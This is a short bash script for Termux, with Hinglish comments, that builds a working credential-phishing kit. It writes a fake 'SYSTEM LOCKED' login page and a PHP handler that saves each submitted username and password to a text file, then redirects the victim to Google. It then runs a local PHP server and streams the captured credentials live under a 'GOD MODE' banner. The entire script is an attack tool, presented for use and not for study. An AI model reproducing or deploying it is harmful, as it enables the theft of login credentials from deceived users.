#!/bin/bash

# --- 1. SETUP & REQUIREMENTS ---
packages=("php" "proot")
for pkg in "${packages[@]}"; do
    if ! command -v $pkg &> /dev/null; then
        echo -e "\033[1;33m[*] Installing $pkg...\033[0m"
        pkg install $pkg -y > /dev/null 2>&1
    fi
done

# --- 2. CLEANUP ---
pkill -f php > /dev/null 2>&1
rm -rf auth/
mkdir -p auth

# --- 3. PREMIUM LOGIN PAGE ---
cat > auth/index.php <<EOF
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body { background: #000; color: #0f0; font-family: courier; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
input { background: #111; border: 1px solid #0f0; color: white; padding: 10px; width: 80%; margin: 5px; border-radius: 5px; }
button { background: #0f0; color: #000; border: none; padding: 10px; width: 85%; font-weight: bold; cursor: pointer; }
</style>
</head>
<body>
<h1>SYSTEM LOCKED</h1>
<p>Enter credentials to unlock</p>
<form method="POST" action="login.php">
<input type="text" name="u" placeholder="Username" required>
<input type="password" name="p" placeholder="Password" required>
<button type="submit">UNLOCK ACCESS</button>
</form>
</body>
</html>
EOF

# --- 4. CAPTURE SCRIPT ---
cat > auth/login.php <<EOF
<?php
file_put_contents("../usernames.txt", "User: " . \$_POST['u'] . " | Pass: " . \$_POST['p'] . "\n", FILE_APPEND);
header('Location: https://google.com');
?>
EOF

# --- 5. INTERFACE ---
GREEN='\033[1;32m'
CYAN='\033[1;36m'
YELLOW='\033[1;33m'
RED='\033[1;31m'
RESET='\033[0m'

clear
echo -e "${GREEN}========================================${RESET}"
echo -e "${CYAN}    ANURAG SERVER (NO NETSTAT FIX)      ${RESET}"
echo -e "${YELLOW}    Status: GOD MODE (Active)           ${RESET}"
echo -e "${GREEN}========================================${RESET}"

echo -e "${CYAN}[*] Starting Server...${RESET}"

# --- 6. START SERVER (Updated Check Logic) ---
# Hum output ko /dev/null me bhej rahe hain taki faltu error na dikhe
termux-chroot php -S 127.0.0.1:8080 -t auth > /dev/null 2>&1 &
PID=$!
sleep 4

# --- 7. CHECK IF RUNNING (Using PS instead of Netstat) ---
if ps -p $PID > /dev/null; then
    echo -e "${GREEN}[✔] SERVER STARTED SUCCESSFULLY!${RESET}"
    echo -e "${CYAN}----------------------------------${RESET}"
    echo -e "${YELLOW}Link: http://127.0.0.1:8080${RESET}"
    echo -e "${CYAN}----------------------------------${RESET}"
    echo -e "${RED}[-] Press Ctrl + C to Stop${RESET}"
    echo ""
    echo -e "${GREEN}Waiting for Password...${RESET}"
    
    # Logs
    touch usernames.txt
    tail -f usernames.txt | while read line; do
        echo -e "${RED}[!] CAPTURED: ${YELLOW}$line${RESET}"
        echo -e "\a"
    done
else
    # Agar ab bhi fail hua to shayad port busy hai
    echo -e "${RED}[!] ERROR: Server fail ho gaya.${RESET}"
    echo -e "${YELLOW}Reason: Port 8080 busy ho sakta hai.${RESET}"
    echo -e "${CYAN}Try restarting Termux app.${RESET}"
fi
